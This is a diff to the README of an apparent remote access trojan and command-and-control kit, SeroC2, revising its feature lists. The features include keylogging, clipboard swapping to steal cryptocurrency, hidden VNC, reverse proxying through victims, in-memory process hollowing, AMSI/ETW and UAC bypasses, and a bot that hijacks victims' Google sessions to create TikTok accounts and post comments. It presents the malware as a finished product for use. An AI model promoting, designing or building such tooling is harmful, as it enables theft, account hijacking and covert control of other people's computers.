@@ -52,8 +52,8 @@ Open `Sero.sln` in **Visual Studio 2026**, build (`F6`), and launch `SeroServer.
 | Keylogger | ✅ | Low-level WH_KEYBOARD_LL hook, offline disk logging (by date), file browser UI, save .txt |
 | Crypto Clipper | ✅ | Monitors clipboard for BTC/ETH/LTC/TRX/SOL/XMR/XRP/DASH/BCH/BNB, silent address swap |
 | Process Manager | ✅ | List all processes with native Windows icons, memory, search, force-kill |
-| HVNC Broadcast | ✅ | Send commands to all HVNC sessions at once — launch apps, open URLs, type text, TikTok signup + comment broadcast |
-| TikTok CDP Auto-Signup | ✅ | Creates TikTok accounts from the client's saved Google session via Chrome DevTools Protocol — no HVNC, fully automated, Chrome runs hidden |
+| HVNC Broadcast | ✅ | Send commands to all HVNC sessions at once — launch apps, open URLs, type text, keyboard shortcuts |
+| TikTok Bot | ✅ | Multi-client panel: CDP auto-signup via Google OAuth (Chrome hidden), account inventory, comment broadcast with rotation across accounts |
 | SOCKS5 Proxy | ✅ | Reverse SOCKS5 — tunnel traffic through the remote machine |
 | File Execute | ✅ | Remote execution of arbitrary files |
 | RunPE / HollowExec | ✅ | In-memory PE injection with PPID spoofing |
@@ -508,8 +508,8 @@ SeroC2/
 - [x] Process Manager — native Windows icons (SHGetFileInfo), memory, search, force-kill
 - [x] Reverse SOCKS5 proxy — tunnel traffic through the remote machine, local SOCKS5 listener
 - [x] TikTok — post comments on videos and livestreams using an existing session, auto-detect session on machine
-- [x] HVNC Broadcast — send commands to all HVNC sessions simultaneously (launch app, open URL, keyboard shortcuts, type text); TikTok signup workflow (Google OAuth via existing session) + TikTok comment broadcast on videos and livestreams
-- [x] TikTok CDP Auto-Signup — creates TikTok accounts from the client's existing Google Chrome session via Chrome DevTools Protocol; Chrome runs off-screen (no HVNC), minimal TCP WebSocket client (no BCL dependency), cookie auto-filled for immediate posting
+- [x] HVNC Broadcast — send commands to all HVNC sessions simultaneously (launch app, open URL, keyboard shortcuts, type text)
+- [x] TikTok Bot — multi-client panel: CDP auto-signup via Google OAuth (Chrome hidden, no HVNC), account inventory, comment broadcast with rotation across all accounts; cookie auto-flows from signup to comment panel
 - [x] Stub size −2 MB — replaced `System.Management` WMI with direct registry P/Invoke (`RegSetKeyValueW`); stub now **7.44 MB** NativeAOT (all features included)
 - [x] Polymorphic Crypter — AES-256-CBC, LZNT1, AMSI+ETW bypass *(closed-source)*
 - [x] UAC Bypass chain — computerdefaults → fodhelper → sdclt → mmc *(closed-source)*
